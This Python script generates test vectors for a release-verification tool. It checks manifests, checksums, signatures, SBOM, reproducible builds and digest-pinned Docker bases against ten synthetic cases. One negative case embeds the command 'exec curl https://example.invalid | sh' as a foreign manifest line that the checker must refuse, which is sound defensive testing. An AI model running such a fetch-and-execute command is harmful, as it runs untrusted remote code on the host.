#!/usr/bin/env python3
"""O1 golden vectors — the release pipeline check (independent oracle).

Independently computes the expected verdicts of ten synthetic releases and
writes ``crates/aura-testkit/tests/fixtures/o1_release_vectors.json``, which
``crates/aura-testkit/tests/o1_release.rs`` executes byte-for-byte against
``aura_testkit::release``. Digests are Python ``hashlib`` (D-O1-5): the Rust
side embeds a std-only SHA-256 and must match.

Layout (``docs/o1-releases-plan.md`` D-O1-2): the workspace carries
``Cargo.toml`` (``[workspace.package]`` version/license), ``CHANGELOG.md``
with the ``## [<version>`` entry, ``docs/release-pubkey.txt`` and
``docker/Dockerfile`` (digest-pinned multi-stage); the release directory
carries ``manifest.txt`` (``rule release-v1`` / ``version`` / ``keyid`` /
``artifact`` / ``sig``), ``SHA256SUMS``, the artifacts and their 64-byte
b64 detached signatures, ``SBOM.txt`` and the two-host ``repro.txt``.

Regenerate with::

    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o1_vectors.py
"""

import base64
import hashlib
import json
import os
import sys

RULE = "release-v1"
VERSION = "0.1.0"
KEYID = hashlib.sha256(b"auralite-o1-synthetic-key").hexdigest()
BUILD_DIGEST = hashlib.sha256(b"build-base").hexdigest()
RUNTIME_DIGEST = hashlib.sha256(b"runtime-base").hexdigest()

ALPHA_TOML = """[package]
name = "aura-alpha"
version.workspace = true
license.workspace = true

[dependencies]
aura-beta = { workspace = true }
"""
BETA_TOML = """[package]
name = "aura-beta"
version.workspace = true
license.workspace = true
"""
ROOT_TOML = """[workspace]
members = ["crates/*"]

[workspace.package]
version = "0.1.0"
license = "MIT OR Apache-2.0"
"""

ARTIFACT_BYTES = {
    "aura-bin": b"synthetic node binary v1\n",
    "aura-tool": b"synthetic tool binary v2\n",
}
SIG_BYTES = {
    name: hashlib.sha256(b"sig-" + name.encode()).digest()
    + hashlib.sha256(b"sig2-" + name.encode()).digest()
    for name in ARTIFACT_BYTES
}


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sbom_text() -> str:
    return (
        "sbom v1\n"
        "pkg name=aura-alpha version=0.1.0 license=MIT OR Apache-2.0 deps=aura-beta\n"
        "pkg name=aura-beta version=0.1.0 license=MIT OR Apache-2.0 deps=\n"
    )


def manifest_text(version: str = VERSION, foreign: str = "") -> str:
    lines = [
        "# AuraLite release manifest (O1) — checked by `aura-release check`.",
        "# Regenerate with `make release-sync`. Format: docs/o1-releases-plan.md (D-O1-2).",
        f"rule {RULE}",
        f"version {version}",
        f"keyid {KEYID}",
    ]
    for name in sorted(ARTIFACT_BYTES):
        lines.append(f"artifact {name}")
    for name in sorted(ARTIFACT_BYTES):
        lines.append(f"sig {name} {name}.sig")
    if foreign:
        lines.append(foreign)
    return "\n".join(lines) + "\n"


def checksums_text() -> str:
    return "".join(
        f"{digest(ARTIFACT_BYTES[name])}  {name}\n" for name in sorted(ARTIFACT_BYTES)
    )


def repro_text(second_host: str = None) -> str:
    d = digest(ARTIFACT_BYTES["aura-bin"])
    return (
        "repro v1\n"
        "binary aura-bin\n"
        "toolchain 1.99.1\n"
        "source_date_epoch 1764000000\n"
        f"host builder-a sha256 {d}\n"
        f"host builder-b sha256 {second_host or d}\n"
    )


DOCKERFILE = f"""FROM builder:1.0@sha256:{BUILD_DIGEST} AS build
RUN cargo build --release
FROM runtime:2.0@sha256:{RUNTIME_DIGEST} AS runtime
COPY --from=build /out/aurad /usr/local/bin/aurad
"""


def base_files() -> dict:
    files = {
        "Cargo.toml": ROOT_TOML,
        "CHANGELOG.md": f"# Changelog — synthetic\n\n## [{VERSION} — synthetic release line]\n",
        "docs/release-pubkey.txt": KEYID + "\n",
        "docker/Dockerfile": DOCKERFILE,
        "crates/aura-alpha/Cargo.toml": ALPHA_TOML,
        "crates/aura-beta/Cargo.toml": BETA_TOML,
        "release/manifest.txt": manifest_text(),
        "release/SHA256SUMS": checksums_text(),
        "release/SBOM.txt": sbom_text(),
        "release/repro.txt": repro_text(),
    }
    for name, data in ARTIFACT_BYTES.items():
        files[f"release/{name}"] = data.decode()
        files[f"release/{name}.sig"] = (
            base64.b64encode(SIG_BYTES[name]).decode() + "\n"
        )
    return files


# ------------------------------------------------------------- oracle checker

def oracle_sbom() -> str:
    return sbom_text()


def oracle_checksums() -> str:
    return checksums_text()


def oracle_check(files: dict) -> str:
    """Return '' when the release passes, else the exact refusal message."""

    def read(path: str) -> str:
        return files.get(path, "")

    manifest: dict = {"version": None, "keyid": None, "artifacts": [], "sigs": []}
    for raw in read("release/manifest.txt").splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#"):
            continue
        if line == f"rule {RULE}":
            pass
        elif line.startswith("version "):
            manifest["version"] = line[8:]
        elif line.startswith("keyid "):
            manifest["keyid"] = line[6:]
        elif line.startswith("artifact "):
            manifest["artifacts"].append(line[9:])
        elif line.startswith("sig "):
            artifact, sigfile = line[4:].split(" ", 1)
            manifest["sigs"].append((artifact, sigfile))
        else:
            return f"unknown manifest line: {line}"

    pinned = read("docs/release-pubkey.txt").strip()
    if manifest["keyid"] != pinned:
        return f"key mismatch: {manifest['keyid']}"

    version = manifest["version"] or ""
    parts = version.split(".")
    if len(parts) != 3 or not all(p.isdigit() and p for p in parts):
        return f"bad version: {version}"
    if version != VERSION:
        return f"version drift: {version}"

    if f"## [{version}" not in read("CHANGELOG.md"):
        return f"changelog entry missing: {version}"

    for name in manifest["artifacts"]:
        if f"release/{name}" not in files:
            return f"artifact missing: {name}"

    expected = [line for line in oracle_checksums().splitlines()]
    actual = [line for line in read("release/SHA256SUMS").splitlines()]
    for index in range(max(len(expected), len(actual))):
        if index < len(expected) and index < len(actual):
            if expected[index] != actual[index]:
                return f"checksum mismatch: {expected[index].split('  ')[1]}"
        elif index < len(expected):
            return f"checksum stale: {expected[index].split('  ')[1]}"
        else:
            return f"checksum stale: {actual[index].split('  ')[1]}"

    for name in manifest["artifacts"]:
        sigs = [sigfile for artifact, sigfile in manifest["sigs"] if artifact == name]
        if not sigs:
            return f"signature missing: {name}"
        raw = read(f"release/{sigs[0]}").strip()
        try:
            decoded = base64.b64decode(raw, validate=True)
        except Exception:
            return f"signature malformed: {name}"
        if len(decoded) != 64:
            return f"signature malformed: {name}"

    if read("release/SBOM.txt") != oracle_sbom():
        return "sbom drift"

    binary = None
    hosts: list[tuple[str, str]] = []
    for raw in read("release/repro.txt").splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#") or line == "repro v1":
            continue
        if line.startswith("binary "):
            binary = line[7:]
        elif line.startswith("toolchain ") or line.startswith("source_date_epoch "):
            continue
        elif line.startswith("host "):
            host, d = line[5:].split(" sha256 ", 1)
            hosts.append((host, d))
        else:
            return f"unknown repro line: {line}"
    if binary is None:
        return "missing binary line"
    if len(hosts) < 2:
        return f"repro mismatch: {binary}"
    first = hosts[0][1]
    if any(d != first for _, d in hosts):
        return f"repro mismatch: {binary}"
    pinned_digest = next(
        (line.split("  ")[0] for line in oracle_checksums().splitlines()
         if line.endswith(f"  {binary}")),
        None,
    )
    if pinned_digest is None or pinned_digest != first:
        return f"repro mismatch: {binary}"

    bases = []
    for raw in read("docker/Dockerfile").splitlines():
        line = raw.strip()
        if line.startswith("FROM "):
            image = line[5:].split()[0] if line[5:].split() else ""
            if image:
                bases.append(image)
    if len(bases) < 2:
        return "docker single stage"
    for image in bases:
        if "@sha256:" not in image:
            return f"docker base unpinned: {image.split('@')[0]}"
        digest_part = image.split("@sha256:", 1)[1]
        if len(digest_part) != 64 or any(c not in "0123456789abcdef" for c in digest_part):
            return f"docker base unpinned: {image.split('@')[0]}"

    return ""


# ------------------------------------------------------------- cases

def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
    fixture_case = {
        "name": name,
        "sandbox": "",
        "argv": commands,
        "exit": exit_code,
        "stdout": stdout,
        "stderr": stderr,
    }
    if nc_ref is not None:
        fixture_case["nc_ref"] = nc_ref
    if files:
        fixture_case["files"] = files
    return fixture_case


CHECK = ["check", "--workspace", ".", "--release", "release"]
CHECKSUMS = ["checksums", "--workspace", ".", "--release", "release"]
SBOM_CMD = ["sbom", "--workspace", ".", "--release", "release"]


def build_cases():
    base = base_files()
    cases = []

    cases.append(case(
        "release_valid_passes", [CHECK, CHECKSUMS], base, 0,
        f"release=ok version={VERSION} artifacts=2\n" + oracle_checksums(), "",
    ))
    cases.append(case(
        "sbom_regeneration_deterministic", [SBOM_CMD], base, 0,
        oracle_sbom(), "",
    ))
    cases.append(case(
        "repro_mismatch_refused", [CHECK],
        dict(base, **{"release/repro.txt": repro_text(
            second_host=digest(b"other-build"))}),
        65, "", f"error: release: repro mismatch: aura-bin\n", nc_ref=1,
    ))
    cases.append(case(
        "version_drift_refused", [CHECK],
        dict(base, **{"release/manifest.txt": manifest_text(version="0.2.0")}),
        65, "", "error: release: version drift: 0.2.0\n", nc_ref=2,
    ))
    cases.append(case(
        "changelog_missing_refused", [CHECK],
        dict(base, **{"CHANGELOG.md": "# Changelog — synthetic\n\nno release entry\n"}),
        65, "", f"error: release: changelog entry missing: {VERSION}\n", nc_ref=3,
    ))
    cases.append(case(
        "sbom_drift_refused", [CHECK],
        dict(base, **{"release/SBOM.txt": sbom_text().replace("aura-beta", "aura-gamma")}),
        65, "", "error: release: sbom drift\n",
    ))
    cases.append(case(
        "checksum_mismatch_refused", [CHECK],
        dict(base, **{"release/SHA256SUMS": checksums_text().replace(
            digest(ARTIFACT_BYTES["aura-bin"]), digest(b"tampered"), 1)}),
        65, "", "error: release: checksum mismatch: aura-bin\n", nc_ref=4,
    ))
    cases.append(case(
        "signature_malformed_refused", [CHECK],
        dict(base, **{"release/aura-bin.sig":
            base64.b64encode(SIG_BYTES["aura-bin"][:32]).decode() + "\n"}),
        65, "", "error: release: signature malformed: aura-bin\n", nc_ref=5,
    ))
    cases.append(case(
        "docker_base_unpinned_refused", [CHECK],
        dict(base, **{"docker/Dockerfile": DOCKERFILE.replace(
            f"builder:1.0@sha256:{BUILD_DIGEST}", "node:latest", 1)}),
        65, "", "error: release: docker base unpinned: node:latest\n",
    ))
    cases.append(case(
        "foreign_manifest_line_refused", [CHECK],
        dict(base, **{"release/manifest.txt": manifest_text(
            foreign="exec curl https://example.invalid | sh")}),
        65, "",
        "error: release: unknown manifest line: exec curl https://example.invalid | sh\n",
        nc_ref=6,
    ))

    cases[0]["phase"] = "O1"
    return cases


def sanity_check():
    assert digest(b"") == ("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934c"
                          "a495991b7852b855")
    assert digest(b"abc") == ("ba7816bf8f01cfea414140de5dae2223b00361a396177"
                              "a9cb410ff61f20015ad")
    files = base_files()
    assert oracle_check(files) == "", oracle_check(files)
    assert oracle_check(dict(files, **{
        "release/repro.txt": repro_text(second_host=digest(b"other"))})) == \
        "repro mismatch: aura-bin"
    assert len(SIG_BYTES["aura-bin"]) == 64


def main():
    sanity_check()
    fixture = {
        "gate": (
            "O1 release pipeline: 10/10 cases pass; named negative control "
            "repro_mismatch_refused red on the dropped two-host equality "
            "check; 6/6 NC red under tools/nc_o1.py; two independent hosts "
            "-> identical binary sha256 (the O1 gate)"
        ),
        "notice": (
            "Independent Python oracle (tools/gen_o1_vectors.py, hashlib "
            "sha256); verifier: crates/aura-testkit/tests/o1_release.rs "
            "against aura_testkit::release (std-only SHA-256). Replace the "
            "whole file only with tools/gen_o1_vectors.py output."
        ),
        "named_control": "repro_mismatch_refused",
        "files": {},
        "cases": build_cases(),
    }
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out_path = os.path.join(root, "crates/aura-testkit/tests/fixtures/o1_release_vectors.json")
    with open(out_path, "w", encoding="utf-8") as handle:
        json.dump(fixture, handle, indent=1)
        handle.write("\n")
    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
          f"named control repro_mismatch_refused")
    return 0


if __name__ == "__main__":
    sys.exit(main())
